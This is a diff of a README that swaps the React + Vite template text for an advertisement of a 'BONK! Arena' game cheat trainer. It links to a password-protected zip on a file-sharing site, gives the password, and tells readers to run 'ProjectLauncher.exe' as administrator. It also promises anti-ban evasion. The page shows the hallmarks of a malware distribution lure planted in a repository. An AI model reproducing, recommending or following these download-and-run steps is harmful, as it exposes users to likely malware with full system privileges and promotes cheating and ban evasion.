@@ -1,12 +1,48 @@
-# React + Vite
+# BONK! Arena Trainer Hack 2025 - Unlimited Coins, Free Skins, God Mode & More Cheats  
 
-This template provides a minimal setup to get React working in Vite with HMR and some ESLint rules.
+## 📜 BONK! Arena Cheat - Overview  
 
-Currently, two official plugins are available:
+Get the ultimate BONK! Arena Trainer Hack 2025 with unlimited resources, instant upgrades, and overpowered abilities! Dominate the arena with free coins, unlocked skins, auto-win mode, and undetectable exploits for non-stop victories.
 
-- [@vitejs/plugin-react](https://github.com/vitejs/vite-plugin-react/blob/main/packages/plugin-react) uses [Babel](https://babeljs.io/) for Fast Refresh
-- [@vitejs/plugin-react-swc](https://github.com/vitejs/vite-plugin-react/blob/main/packages/plugin-react-swc) uses [SWC](https://swc.rs/) for Fast Refresh
+# [DOWNLOAD](https://www.4sync.com/zip/WamRVb3D/Project_V193.html)  
+## PASSWORD: 1322
+ 
+<img width="822" height="460" alt="Screenshot_1" src="https://github.com/user-attachments/assets/0483a47a-f3c0-412d-83d6-82c05104bf66" />
 
-## Expanding the ESLint configuration
 
-If you are developing a production application, we recommend using TypeScript with type-aware lint rules enabled. Check out the [TS template](https://github.com/vitejs/vite/tree/main/packages/create-vite/template-react-ts) for information on how to integrate TypeScript and [`typescript-eslint`](https://typescript-eslint.io) in your project.
+## ⚙ Features  
+
+* **Unlimited Coins** – Generate infinite in-game currency for instant upgrades and purchases  
+* **Free Skins Unlocker** – Access all premium skins and cosmetics without spending real money  
+* **God Mode** – Become invincible with no damage taken from enemies  
+* **One-Hit Kill** – Defeat any opponent with a single attack for instant wins  
+* **Auto-Win Hack** – Skip battles and automatically claim victory rewards  
+* **Unlimited Energy** – Play endlessly without waiting for energy refills  
+* **Speed Multiplier** – Move and attack faster than normal players  
+* **Anti-Ban Protection** – Stay undetected with secure cheat integration  
+
+And many other features!
+
+---
+
+## 📊 System requirements
+
+> 🔲 **Supported CPU:** AMD & Intel
+>
+> 🔧 **Supported architectures:** 64-bit, 32-bit
+>
+> 💿 **Supported OS:** Windows 11, Windows 10, Windows 8, Windows 7
+>
+> 🖥️ **Supported modes:** Borderless, Windowed, Fullscreen
+>
+> 🛠️ **.NET Framework:** 4.8+
+
+### 🤔 How to install on Windows?
+
+- Download the .zip archive using download button.
+- Extract the archive to a secure location.
+- Run `ProjectLauncher.exe` as administrator.
+
+💬 Have questions or need support? Join our active Discord community:
+
+[![Discord](https://img.shields.io/badge/Discord-Join-7289DA?logo=discord)](https://discord.gg/<ГЕН.СТРОКА>)
